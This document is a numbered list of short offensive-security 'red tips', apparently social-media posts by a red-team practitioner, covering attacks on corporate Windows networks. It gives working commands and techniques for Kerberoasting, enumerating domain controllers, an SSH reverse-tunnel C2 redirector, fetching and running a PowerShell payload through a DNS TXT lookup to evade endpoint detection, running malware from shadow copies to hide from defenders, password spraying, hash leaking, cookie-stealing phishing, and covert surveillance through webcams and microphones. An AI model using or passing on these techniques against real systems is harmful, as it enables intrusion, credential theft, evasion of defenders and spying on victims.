Red Tip #1: Profile your victim and use their user agent to mask your traffic. Alternatively use UA from software such as Outlook.
redtip


Red tip #2: If the enemy SOC is using proxy logs for analysis. Guess what? It wont log cookies or POST body content as can be sensitive.
redtip


Red tip #3: Taking a snapshot of AD can let you browse, explore and formulate future attacks if access is lost momentarily.
redtip


Red tip #4: consider using Office Template macros and replacing normal.dot for persistence in VDI environments.
redtip


Red tip #5: Do a DNS lookup for terms such as intranet, sharepoint, wiki, nessus, cyberark and many others to start intel on your target.
redtip


Red tip #6: Got access but need to find target? Use WMIC to query and dump the DNS Zone for a better view of assets - https://serverfault.com/questions/550385/export-all-hosts-from-dns-manager-using-powershell
redtip


Red tip #7: Whether PSEXEC, WMI, PS remoting or even the recent COM execution technique for lateral movement. Dont forget beloved RDP.
redtip


Red tip #8: Make sure theres trackers in your: emails, delivery server and payload execution. Any more? Comment to share!
redtip


Red tip #9: When PowerUp yields no results, dont forget SysInternals AutoRuns. Often you can find unexpected surprises :)
redtip


Red tip #10: When using BloodHound, dont forget DA equivalents such as administrators and server operators etc too. These arent mapped.
redtip


Red tip #11: When navigating mature environments, a good old network diagram along with AD OUs can help to shed some light into next steps.
redtip


Red tip #12: Kerberoast them hashes, could be a fast route to domain administrator. PowerView: Invoke-Kerberoast -Format Hashcat
redtip


Red tip #13: Shared local administrator account hashes are great for lateral movement. Find machines based on the same build and attack away
redtip


Red tip #14: Got extra credentials? Use different sets for separate egress channels so that if one account is disabled all the rest are ok.
redtip


Red tip #15: You dont need payloads when you can phish credentials and login to Citrix, VPN, email with no 2FA. Check the perimeter.
redtip


Red tip #16: @dafthack MailSniper, @domchell LyncSniper can be a useful but noisy way to obtain AD credentials into an organization.
redtip


Red tip #17: @_staaldraad Ruler tool can be used to obtain code execution on a system running Outlook if you can access exchange externally
redtip


Red tip #18: When tools like MailSniper dont work in custom environments, you still have good old @Burp_Suite to replicate the attacks
redtip


Red tip #19: Need a DC? echo %LOGONSERVER%. Need a list? nltest /dclist, nslookup -q=srv _kerberos._tcp (domain suffix can autocomplete)
redtip


Red tip #20: So apparently not many people use SSH for redirector setup. So try out SSH c2 -R *:80:localhost:80. SSH config GatewayPorts yes
redtip


Red tip #21: Found open user home shares that are accessible? See if you can drop into Startup Programs for lateral movement and privesc.
redtip


Red tip #22: Use VNC, microphone and webcam to perform surveillance. Netstat, tasklist can provide context into what the users doing.
redtip


Red tip #23: Stash payloads in C:$Recycle.Bin
redtip


Red tip #24: Compromise the SOC and Security teams to watch their progress and track their email alerts for sophisticated threats
redtip


Red tip #25: Probably dont do this on a red team, but spray for Welcome1, Password1 if youre struggling to move. But move off fast.
redtip


Red tip #26: Split your campaigns up so that they are independent. Fire tons at once for decoys and to burn out the defense.
redtip


Red tip #27: Need more credentials? Search for passwords on Sharepoint, and intranet.
redtip


Red tip #28: Look for asset registers to understand who owns what machine, make and model. Theres usually an asset label to host name too!
redtip


Red tip #29: Lateral movement: printers, open webroots, good old Tomcat, what are your quick wins?
redtip


Red tip #30: Get AD credentials? Turn up on site and you might be able to use them to login to Corporate Wifi :)
redtip


Red tip #31: Hunting e-mails and network shares for penetration testing reports can often yield good results.
redtip


Red tip #32: List mounts: net use, look for shared folders and drop a UNC icon LNK into it. Run Inveigh or Wireshark on host to grab hashes.
redtip


Red tip #33: Orgs are transitioning to cloud services such as AWS, Beanstalk, O365, Google Apps. 2FA is vital - password reset to compromise.
redtip


Red tip #34: OpSec. Set notifications to your phone for logins or intrusion attempts in any part of your attack infrastructure.
redtip


Red tip #35: FireEye sandbox flagging your payloads? Try anti sandbox techniques! If not, just use HTA to get into memory as it doesnt scan
redtip


Red tip #36: Dont forget the good old GPP passwords in SYSVOL. There may be cached GPP on the machine. Applying the patch isnt enough
redtip


Red tip #37: Use GenHTA to generate HTA files that use anti-sandboxing techniques. https://github.com/vysec/GenHTA
redtip


Red tip #38: Having trouble getting @armitagehacker CobaltStrikes evil.hta through defenses? https://github.com/vysec/MorphHTA
redtip


Red tip #39: If emails get bounced, read the email! Sometimes due to malware scanners, spam etc. Or you may even get an out of office reply.
redtip


Red tip #40: @0x09AL suggests looking for default credentials on printers and embedded devices. Move off initial foothold using this.
redtip


Red tip #41: @Oddvarmoe suggests using Alternate Data Streams if you need to put a file on disk. For example https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1
redtip


Red tip #42: Got OS level access to a middle tier? Task list, netstat and wmic process list full | findstr /I commandline for more ideas!
redtip


Red tip #43: So you know where the server application files are. Download the binaries and check out configuration files for conn. strings
redtip


Red tip #44: Run PEiD and other packer / technology checkers to find out the language and packer used on downloaded server binaries.
redtip


Red tip #45: Run strings on the application binary for potentially other cleartext sensitive strings! (Unicode mode too)
redtip


Red tip #46: On a VDI? Check out C:\ and other disks for potentially sensitive files other users may have saved there.

redtip


Red tip #49: Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system
redtip


Red tip #50: Carbon Black checks for IEX and web req commands. Use powershell "powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]"
redtip


Red tip #51: Cant open C drive? Try \127.0.0.1\c$
redtip


Red tip #52: SC doesnt take credentials. Cant use runas? Try net use \targetip\ipc$ password /u:domain\username then sc to psexec
redtip


Red tip #53: When stick phishing for 2FA, consider using @mrgretzky Evilginx project which logs cookies. https://breakdev.org/evilginx-1-1-release/
redtip


Red tip #54: Hide from blue. Volume shadow copy then execute \?\GLOBALROOT\Device\HarddiskVolumeShadowColy1\malware.exe/dll then delete VSC
redtip


Red tip #55: SMB hash leaking using a UNC path for image in page for drive by leak can give you credentials for less mature environments.
redtip


Red tip #56: Target victims using email authentication such as Microsoft Account on Windows 10? Hash leak exposes full email address!
redtip


Red tip #57: Working in teams yields better results; and best of all Makes Offensive operations more fun and keeps the adrenaline pumping
redtip


Red tip #58: Discuss business targets and objectives with your clients. This process should set non technical goals such as "ATM spit money"
redtip


Red tip #59: Checking whether a server or host is good for egress? Likely to go down? "systeminfo | findstr /i boot"
redtip


Red tip #60: Type "query user" to see who else is connected to the machine.
redtip

redtip


Red tip #72: Most people understand email sec wrong. SPF does not mean not spoofable. SPF does nothing without DMARC.
